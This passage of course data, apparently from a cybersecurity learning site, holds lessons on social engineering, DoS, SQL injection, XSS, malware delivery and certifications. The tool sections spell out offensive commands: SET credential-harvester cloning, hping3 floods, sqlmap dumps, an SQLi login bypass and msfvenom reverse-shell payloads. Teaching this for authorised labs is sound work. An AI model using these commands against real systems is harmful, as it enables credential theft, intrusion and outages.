        title: 'Social Engineering Basics',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Social engineering is a cyber attack technique that manipulates human behavior to gain unauthorized access to systems, information, or resources. Instead of exploiting technical vulnerabilities, social engineering attacks exploit human trust, emotions, and psychological weaknesses. This makes social engineering one of the most effective and dangerous attack methods in cybersecurity.</p>
          <p class="mb-6 text-gray-300">Even highly secure systems can be compromised if a user is tricked into revealing sensitive information or performing unsafe actions.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Social Engineering?</h2>
          <p class="mb-3 text-gray-300">Social engineering involves deceiving individuals into breaking normal security procedures. Attackers often impersonate trusted people or organizations and create scenarios that pressure victims into acting quickly without thinking critically.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">Common Psychological Triggers</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Trust</li>
            <li>Fear</li>
            <li>Urgency</li>
            <li>Curiosity</li>
            <li>Authority</li>
          </ul>
          <p class="mb-6 text-gray-300">Because humans are often the weakest link, social engineering can bypass firewalls, encryption, and antivirus systems.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Types of Social Engineering Attacks</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">1. Pretexting</h3>
          <p class="mb-3 text-gray-300">The attacker creates a fake scenario or identity to gain trust. <span class="font-semibold text-white">Example:</span> Pretending to be IT support and asking for login credentials to “fix an issue.”</p>
          <h3 class="text-lg font-semibold mb-2 text-white">2. Baiting</h3>
          <p class="mb-3 text-gray-300">Attackers lure victims with something attractive. <span class="font-semibold text-white">Example:</span> Leaving infected USB drives labeled “Salary Data” in public spaces.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">3. Phishing</h3>
          <p class="mb-3 text-gray-300">Sending fake emails or messages to trick users into revealing sensitive information.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">4. Tailgating</h3>
          <p class="mb-3 text-gray-300">Physically following an authorized person into a restricted area. <span class="font-semibold text-white">Example:</span> Claiming to have forgotten an access card.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">5. Impersonation</h3>
          <p class="mb-3 text-gray-300">Pretending to be a trusted authority figure like a manager, vendor, or official.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">6. Quid Pro Quo</h3>
          <p class="mb-6 text-gray-300">Offering a benefit in exchange for information. <span class="font-semibold text-white">Example:</span> Offering “free technical support” for login details.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Social Engineering is So Effective</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Humans naturally trust authority and familiarity</li>
            <li>People act under pressure or urgency</li>
            <li>Lack of security awareness training</li>
            <li>Overconfidence in technical controls</li>
            <li>Attackers carefully research targets</li>
          </ul>
          <p class="mb-6 text-gray-300">Attacks are often personalized, making them difficult to detect.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Impact</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Data breaches</li>
            <li>Financial loss</li>
            <li>Identity theft</li>
            <li>Malware infections</li>
            <li>Full system or network compromise</li>
          </ul>
          <p class="mb-6 text-gray-300">Many large-scale breaches started with a single social engineering attack.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Defense Against Social Engineering</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Regular security awareness training</li>
            <li>Verify identities before sharing information</li>
            <li>Follow strict access control policies</li>
            <li>Encourage employees to question unusual requests</li>
            <li>Implement multi-factor authentication</li>
            <li>Establish clear incident reporting procedures</li>
          </ul>
          <p class="mb-6 text-gray-300">Security is not just technical — it is behavioral and procedural.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Social Engineering in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Test employee awareness</li>
            <li>Identify behavioral vulnerabilities</li>
            <li>Improve security training programs</li>
            <li>Demonstrate real-world risks</li>
          </ul>
          <p class="mb-6 text-gray-300">Simulations are conducted ethically and with proper authorization.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Social Engineering in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>User education and awareness</li>
            <li>Policy enforcement</li>
            <li>Monitoring suspicious communication</li>
            <li>Encouraging a security-first culture</li>
            <li>Reducing reliance on single-factor authentication</li>
          </ul>
          <p class="mb-6 text-gray-300">Human-focused defenses are critical to reducing social engineering risks.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Social Engineering',
            content: `🛠 Tool Name: Social-Engineer Toolkit (SET)

Related Concept: Social Engineering Attacks

What is SET?
SET is a penetration testing framework designed specifically for social engineering-based attacks, allowing realistic simulations in controlled environments.

Why This Tool Matches This Topic
Designed for social engineering simulations
Supports phishing, credential harvesting, and payload delivery
Widely used for security awareness training
Helps understand attacker psychology and techniques

Basic Commands / Usage
Launch SET
sudo setoolkit

Choose Social Engineering Attacks
Select Social-Engineering Attacks from the main menu

Select Attack Vector
Website Attack Vectors
Credential Harvester
Mass Mailer (lab environments)

Clone a Website (Lab Use Only)
Enter target URL
SET creates a fake site to capture credentials`
          }
        ]
      },
      {
        title: 'Denial-of-Service (DoS) Attacks',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">A Denial-of-Service (DoS) attack aims to make a system, service, or network unavailable. Rather than stealing data, the goal is to disrupt availability — a core pillar of the CIA Triad. DoS attacks overwhelm systems with excessive traffic, requests, or resource consumption until they can no longer function normally.</p>
          <p class="mb-6 text-gray-300">These attacks can cause downtime, financial losses, reputational damage, and reduced user trust.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">How DoS Attacks Work</h2>
          <p class="mb-3 text-gray-300">An attacker floods a target with more requests than it can handle. When system resources (CPU, memory, bandwidth, threads) are exhausted, legitimate users are denied access.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">Common Exploited Weaknesses</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Network bandwidth limitations</li>
            <li>Application logic flaws</li>
            <li>Protocol weaknesses</li>
            <li>Improper resource handling</li>
          </ul>
          <p class="mb-6 text-gray-300">Even well-secured systems can be affected if they are not designed to handle sudden traffic spikes.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of DoS Attacks</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">1. Volume-Based Attacks</h3>
          <p class="mb-3 text-gray-300">Flood the network with massive traffic (e.g., ICMP flood, UDP flood) to saturate bandwidth so legitimate traffic cannot reach the server.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">2. Protocol-Based Attacks</h3>
          <p class="mb-3 text-gray-300">Exploit weaknesses in network protocols (e.g., SYN flood, Ping of Death, Smurf attack) to exhaust server resources such as connection tables or memory.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">3. Application-Layer Attacks</h3>
          <p class="mb-6 text-gray-300">Target specific applications (e.g., HTTP flood, Slowloris) to exhaust application resources while appearing like legitimate traffic, making detection difficult.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Distributed Denial-of-Service (DDoS)</h2>
          <p class="mb-6 text-gray-300">DDoS uses multiple compromised systems (botnets) to attack a single target simultaneously. Because traffic comes from many sources, DDoS is harder to detect, difficult to block, and more damaging. Malware-infected devices (including IoT) often form botnets.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Impact of DoS Attacks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Website downtime and service disruption</li>
            <li>Financial loss and SLA violations</li>
            <li>Loss of customer trust</li>
            <li>Increased operational costs</li>
          </ul>
          <p class="mb-6 text-gray-300">For critical sectors (banking, healthcare, government), consequences can be severe.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Defense Against DoS Attacks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Implement rate limiting and traffic filtering</li>
            <li>Use firewalls and IDS/IPS systems</li>
            <li>Deploy load balancers</li>
            <li>Use CDNs to absorb spikes</li>
            <li>Monitor traffic for anomalies</li>
            <li>Configure timeouts and connection limits</li>
            <li>Use DDoS protection services</li>
          </ul>
          <p class="mb-6 text-gray-300">Defense focuses on early detection and traffic control rather than total prevention.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">DoS in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Test system resilience</li>
            <li>Identify resource exhaustion vulnerabilities</li>
            <li>Evaluate incident response readiness</li>
            <li>Improve infrastructure scalability</li>
          </ul>
          <p class="mb-6 text-gray-300">All testing is done with authorization and strict limits.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">DoS in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Monitor sudden traffic spikes</li>
            <li>Watch for unusual connection patterns</li>
            <li>Track repeated requests from single or multiple IPs</li>
            <li>Observe server resource usage</li>
          </ul>
          <p class="mb-6 text-gray-300">Quick detection and response are critical to minimizing damage.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Examples</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>E-commerce sites targeted during sales</li>
            <li>DDoS attacks on gaming servers</li>
            <li>Political or ideological attacks on government sites</li>
            <li>Extortion-based DoS demanding ransom</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – DoS Testing',
            content: `🛠 Tool Name: hping3

Related Concept: DoS & Traffic Flood Testing

What is hping3?
hping3 is a command-line network tool for generating custom TCP/IP packets, useful for testing firewall rules, network behavior, and DoS resistance in controlled environments.

Why This Tool Matches This Topic
Simulates SYN and ICMP floods
Helps understand how DoS overloads systems
Useful for testing firewall and IDS responses
Common in security labs

Basic Commands
ICMP Flood (Lab Use Only)
sudo hping3 --icmp target_ip

SYN Flood Test
sudo hping3 -S --flood -p 80 target_ip

Send Limited Packets (Safe Testing)
sudo hping3 -S -p 80 -c 50 target_ip

Random Source IPs
sudo hping3 -S --flood --rand-source -p 80 target_ip`
          }
        ]
      },
      {
        title: 'SQL Injection Basics',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">SQL Injection (SQLi) is a web application attack that allows an attacker to interfere with the queries an application makes to its database. By injecting malicious SQL into input fields or parameters, attackers can read sensitive data, modify records, execute administrative operations, and in severe cases, gain full control of the server.</p>
          <p class="mb-6 text-gray-300">SQLi is among the most critical web vulnerabilities and remains common due to improper input handling and insecure query construction.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">How SQL Injection Works</h2>
          <p class="mb-3 text-gray-300">Applications often build SQL queries using input from users (e.g., login forms, search boxes, URL parameters). If the input is concatenated directly into the query without proper controls, attackers can add SQL syntax to alter the query.</p>
          <div class="p-4 bg-[#252526] rounded mb-6 border border-[#333]">
            <p class="text-gray-300 text-sm"><span class="font-semibold text-white">Example (Insecure Query):</span></p>
            <pre class="mt-2 text-gray-300 text-sm whitespace-pre-wrap">SELECT * FROM users WHERE username = '<span class="text-green-400">user_input</span>' AND password = '<span class="text-green-400">pass_input</span>';</pre>
            <p class="mt-3 text-gray-300 text-sm"><span class="font-semibold text-white">Malicious Input:</span> username: <code class="text-orange-300">admin' --</code>, password: <code class="text-orange-300">anything</code></p>
            <pre class="mt-2 text-gray-300 text-sm whitespace-pre-wrap">SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';</pre>
            <p class="mt-3 text-gray-300 text-sm">The <code class="text-orange-300">--</code> comment terminates the rest of the condition, potentially bypassing authentication.</p>
          </div>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Types of SQL Injection</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">Union-Based SQLi</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Leverages <code class="text-orange-300">UNION SELECT</code> to combine results from additional queries</li>
            <li>Commonly used to extract data from other tables</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Error-Based SQLi</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Forces database errors that reveal information (version, column names)</li>
            <li>Relies on verbose error messages from the server</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Blind SQLi (Boolean & Time-Based)</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Boolean-Based:</span> Observes true/false differences in page behavior</li>
            <li><span class="font-semibold text-white">Time-Based:</span> Uses functions like <code class="text-orange-300">SLEEP()</code> to infer data via response delays</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Stacked Queries</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Executes multiple queries separated by semicolons</li>
            <li>May enable administrative actions if supported by the backend</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Why SQLi is Dangerous</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Credential theft and account takeover</li>
            <li>Exfiltration of sensitive data (PII, financial records)</li>
            <li>Modification or deletion of application data</li>
            <li>Privilege escalation within the application</li>
            <li>Potential remote code execution depending on configuration</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Ethical Hacking Perspective</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify unsafe query construction</li>
            <li>Demonstrate exploitability to drive secure coding</li>
            <li>Validate WAF and input validation effectiveness</li>
            <li>Report findings with reproducible payloads and impact</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Defensive Security Practices</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Use parameterized queries (prepared statements)</li>
            <li>Prefer ORM frameworks that avoid raw SQL concatenation</li>
            <li>Validate and sanitize all inputs (type, length, format)</li>
            <li>Enforce least-privilege database accounts</li>
            <li>Disable detailed error messages in production</li>
            <li>Apply allowlists for expected values where possible</li>
            <li>Deploy WAF rules to detect and block common SQLi payloads</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Quick Testing Tips (Safe Labs)</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify injectable parameters with simple quotes</li>
            <li>Enumerate columns with <code class="text-orange-300">ORDER BY</code> and <code class="text-orange-300">UNION SELECT</code></li>
            <li>Fingerprint the database (MySQL, PostgreSQL, MSSQL)</li>
            <li>Extract schema information cautiously in approved environments</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Key Takeaways</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Never concatenate user input directly into SQL</li>
            <li>Use prepared statements and strict validation everywhere</li>
            <li>Combine secure coding with WAF and least privilege</li>
            <li>Regularly test and monitor to catch regressions</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – SQL Injection',
            content: `🛠 Tool Name: sqlmap

Related Concept: Automated SQL Injection Detection & Exploitation

What is sqlmap?
sqlmap is an open-source tool that automates the detection and exploitation of SQL injection flaws and database fingerprinting. It supports multiple DBMS and both GET/POST requests.

Why This Tool Matches This Topic
Automates SQLi discovery and data extraction
Identifies DB type and version
Supports union, error, and blind techniques
Useful for safe, authorized lab testing

Basic Commands
Detect SQL Injection on a URL
sqlmap -u "http://target.com/item.php?id=1" --batch

POST Request with Data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --batch

List Databases
sqlmap -u "http://target.com/item.php?id=1" --dbs

List Tables of a Database
sqlmap -u "http://target.com/item.php?id=1" -D mydb --tables

Dump Table Data (Lab Use Only)
sqlmap -u "http://target.com/item.php?id=1" -D mydb -T users --dump

Time-Based Blind Technique
sqlmap -u "http://target.com/item.php?id=1" --technique=T --level=3 --risk=2

Provide Cookies (If Needed)
sqlmap -u "http://target.com/item.php?id=1" --cookie="PHPSESSID=abc123"
`
          }
        ]
      },
      {
        title: 'XSS (Cross-Site Scripting) Basics',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Cross-Site Scripting (XSS) is a client-side web application vulnerability that allows attackers to inject malicious scripts into trusted websites. These scripts execute in the victim’s browser when they visit the affected page, targeting users rather than servers.</p>
          <p class="mb-6 text-gray-300">XSS directly impacts confidentiality and integrity: attackers can steal sensitive information, hijack sessions, manipulate content, and perform actions on behalf of users.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">How XSS Works</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>The application accepts user input</li>
            <li>Input is not properly validated or sanitized</li>
            <li>Malicious input is reflected or stored and then displayed to users</li>
            <li>The browser executes the injected script as trusted code</li>
          </ul>
          <p class="mb-6 text-gray-300">Because browsers trust content from legitimate sites, injected scripts run with the same privileges as the site.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Types of XSS Attacks</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">1. Stored XSS (Persistent)</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Malicious scripts are permanently stored on the server (e.g., databases, comments, profiles)</li>
            <li>Every user who views the page executes the script automatically</li>
            <li><span class="font-semibold text-white">Example:</span> Injecting JavaScript into a blog comment field that runs for all visitors</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">2. Reflected XSS</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Injected script is reflected immediately in the response and executes when the victim clicks a crafted link</li>
            <li><span class="font-semibold text-white">Example:</span> A search page reflecting unsanitized query parameters</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">3. DOM-Based XSS</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Vulnerability exists in client-side JavaScript</li>
            <li>Browser modifies page using unsafe methods (e.g., <code class="text-orange-300">innerHTML</code>, <code class="text-orange-300">document.location</code>)</li>
            <li><span class="font-semibold text-white">Example:</span> JavaScript using URL fragments to update HTML without validation</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Impact of XSS Attacks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Session hijacking and cookie theft</li>
            <li>Keylogging and credential capture</li>
            <li>Phishing redirections and social engineering</li>
            <li>Website defacement or content manipulation</li>
            <li>Unauthorized actions performed on behalf of users</li>
          </ul>
          <p class="mb-6 text-gray-300">In severe cases, attackers can compromise user accounts without knowing credentials.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Why XSS is Dangerous</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Exploits user trust in websites</li>
            <li>Often bypasses firewalls and antivirus</li>
            <li>Affects multiple users at once</li>
            <li>Can be chained with CSRF and phishing</li>
            <li>Difficult for users to detect visually</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Defense Against XSS</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Validate and sanitize all inputs</li>
            <li>Encode output before rendering</li>
            <li>Use Content Security Policy (CSP)</li>
            <li>Avoid unsafe JavaScript functions (e.g., <code class="text-orange-300">eval</code>, <code class="text-orange-300">innerHTML</code>)</li>
            <li>Use modern frameworks with built‑in XSS protections</li>
            <li>Perform regular security testing</li>
            <li>Leverage WAF rules against common payloads</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">XSS in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify vulnerable input fields</li>
            <li>Demonstrate real‑world user impact</li>
            <li>Improve secure coding practices</li>
            <li>Educate developers with reproducible examples</li>
          </ul>
          <p class="mb-6 text-gray-300">Testing is conducted only with proper authorization.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">XSS in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Secure development practices and code reviews</li>
            <li>Static analysis and linting for unsafe sinks</li>
            <li>Web application firewalls (WAF)</li>
            <li>Browser security headers</li>
            <li>Continuous vulnerability scanning</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Real‑World Example</h2>
          <p class="mb-6 text-gray-300">An attacker injects JavaScript into a vulnerable feedback form, stealing session cookies of logged‑in users and gaining unauthorized access to accounts.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – XSS Testing',
            content: `🛠 Tool Name: XSStrike

Related Concept: Cross-Site Scripting Testing

What is XSStrike?
XSStrike is an advanced XSS detection suite with context-aware payload generation, intelligent fuzzing, multi-threaded crawling, parameter discovery, WAF detection/evasion, and DOM XSS scanning.

Why This Tool Matches This Topic
Specifically designed for XSS testing
Detects reflected and DOM-based XSS
Smart payload generator with context analysis
Ideal for learning modern XSS testing techniques

Basic Commands
Clone XSStrike
git clone https://github.com/s0md3v/XSStrike.git

Navigate to Tool Directory
cd XSStrike

Install Requirements
pip install -r requirements.txt --break-system-packages

Run XSS Scan on a URL
python3 xsstrike.py -u "http://target.com/page.php?param=test"

Enable Crawl Mode
python3 xsstrike.py -u "http://target.com" --crawl

Use Payload File
python3 xsstrike.py -u "http://target.com/page.php?param=test" --file payloads.txt`
          }
        ]
      },
      {
        title: 'Malware Delivery Techniques',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Malware delivery techniques are the methods attackers use to transport and install malicious software onto a victim’s system. Even the most sophisticated malware is useless unless it reaches the target. Because of this, delivery is one of the most critical phases of the cyberattack lifecycle.</p>
          <p class="mb-6 text-gray-300">Attackers continuously evolve delivery methods to bypass user awareness, antivirus, firewalls, and endpoint protection. Understanding these techniques helps ethical hackers and defenders recognize, prevent, and mitigate real‑world attacks.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Why Malware Delivery is Critical</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Enables persistence on victim systems</li>
            <li>Allows remote control and command execution</li>
            <li>Facilitates data theft and encryption (ransomware)</li>
            <li>Enables lateral movement across networks</li>
          </ul>
          <p class="mb-6 text-gray-300">Most breaches begin with successful delivery, often exploiting human trust more than technical flaws.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Common Malware Delivery Techniques</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">1. Phishing Emails</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Emails that appear legitimate with malicious attachments or links</li>
            <li>Examples: fake invoices, job offers, account verification, urgent security alerts</li>
            <li>Clicking links or opening attachments executes malware</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">2. Malicious Attachments</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Embedded malware in PDFs, macro‑enabled Word/Excel, ZIP/RAR archives</li>
            <li>Often requires user interaction (e.g., enabling macros)</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">3. Drive‑By Downloads</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Automatic downloads when visiting compromised or malicious websites</li>
            <li>Exploit browser vulnerabilities, outdated plugins, weak configurations</li>
            <li>May require no user action beyond visiting the page</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">4. Trojanized Software</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Legitimate software modified to include malicious code</li>
            <li>Common in pirated software, fake updates, modified installers</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">5. USB and Removable Media</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Malware spreads via infected USB drives</li>
            <li>Executes automatically or tricks users into opening malicious files</li>
            <li>Effective in air‑gapped systems, corporate environments, ICS</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">6. Exploit Kits</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Scan systems for vulnerabilities and deliver tailored malware</li>
            <li>Hosted on compromised websites, operating silently</li>
          </ul>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Real‑World Impact</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Ransomware operations</li>
            <li>Banking trojans and credential theft</li>
            <li>Spyware and surveillance campaigns</li>
            <li>Corporate espionage</li>
            <li>Nation‑state cyber operations</li>
          </ul>
          <p class="mb-6 text-gray-300">A single successful delivery can lead to complete organizational compromise.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Why Users Fall Victim</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Lack of security awareness</li>
            <li>Trust in familiar brands</li>
            <li>Urgency and fear tactics</li>
            <li>Poor endpoint security</li>
            <li>Outdated software and unpatched systems</li>
          </ul>
          <p class="mb-6 text-gray-300">Attackers exploit psychology more than technology.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Defensive Measures</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Email filtering and sandboxing</li>
            <li>Endpoint Detection and Response (EDR)</li>
            <li>User awareness training and phishing simulations</li>
            <li>Application whitelisting</li>
            <li>Regular patching and updates</li>
            <li>Network traffic monitoring and anomaly detection</li>
          </ul>
          <p class="mb-6 text-gray-300">Prevention focuses on blocking delivery before execution.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Malware Delivery in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Simulate delivery to test email security</li>
            <li>Evaluate endpoint defenses</li>
            <li>Assess user awareness</li>
            <li>Identify weak attack paths</li>
          </ul>
          <p class="mb-6 text-gray-300">All testing is conducted legally and with authorization.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Malware Delivery Simulation',
            content: `🛠 Tool Name: MSFVenom

Related Concept: Malware Payload Generation & Delivery

What is MSFVenom?
MSFVenom is part of the Metasploit Framework. It generates custom payloads for penetration testing and red‑team simulations, helping demonstrate delivery methods and test defenses.

Why This Tool Matches This Topic
Core tool for simulating malware delivery
Supports multiple platforms (Windows, Linux, Android)
Used widely in professional pentests
Demonstrates realistic attack behaviors

Basic Commands
Generate Windows Reverse TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe

Generate Linux Payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > payload.elf

Generate Android Payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk

List Available Payloads
msfvenom -l payloads`
          }
        ]
      },
      {
        title: 'Introduction to Certifications (CompTIA Security+, A+, Network+, CEH, OSCP, CC, etc.)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Cyber Security certifications validate knowledge, skill, and practical ability. In a field where trust and competence matter, certifications provide standardized proof of expertise for students, freshers, and professionals.</p>
          <p class="mb-6 text-gray-300">They are not just exams — they reflect understanding of principles, attack techniques, defensive strategies, tools, and ethical responsibility.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Why Certifications Matter</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Establish credibility and trust</li>
            <li>Improve job opportunities and salary prospects</li>
            <li>Provide structured learning paths</li>
            <li>Align skills with industry standards</li>
            <li>Prepare for real‑world security challenges</li>
          </ul>
          <p class="mb-6 text-gray-300">Many organizations require certifications as eligibility for security roles.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Types of Certifications</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">1. Entry‑Level Certifications</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>CompTIA A+ — Hardware, OS, basic security</li>
            <li>CompTIA Network+ — Networking fundamentals, security concepts</li>
            <li>CompTIA Security+ — Core security, risk, cryptography, threats</li>
          </ul>
          <p class="mb-6 text-gray-300">These build a strong foundation for specialization.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">2. Intermediate Certifications</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>CEH (Certified Ethical Hacker) — Hacking methodologies, tools, attack vectors</li>
            <li>CySA+ — Defensive security, threat detection</li>
            <li>Blue Team Level 1 (BTL1) — Defensive monitoring, incident response</li>
          </ul>
          <p class="mb-6 text-gray-300">These bridge the gap between theory and practice.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">3. Advanced Certifications</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>OSCP — Highly practical penetration testing</li>
            <li>CISSP — Security architecture, governance, risk management</li>
            <li>CISM — Information security management and leadership</li>
          </ul>
          <p class="mb-6 text-gray-300">These demand problem‑solving, persistence, and advanced skills.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Certification Paths by Role</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Ethical Hacker / Pentester → CEH, OSCP</li>
            <li>Security Analyst / SOC → Security+, CySA+</li>
            <li>Network Security Engineer → Network+, Security+</li>
            <li>Security Manager → CISSP, CISM</li>
          </ul>
          <p class="mb-6 text-gray-300">Choose certifications based on goals and current skill level.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Importance of Hands‑On Practice</h2>
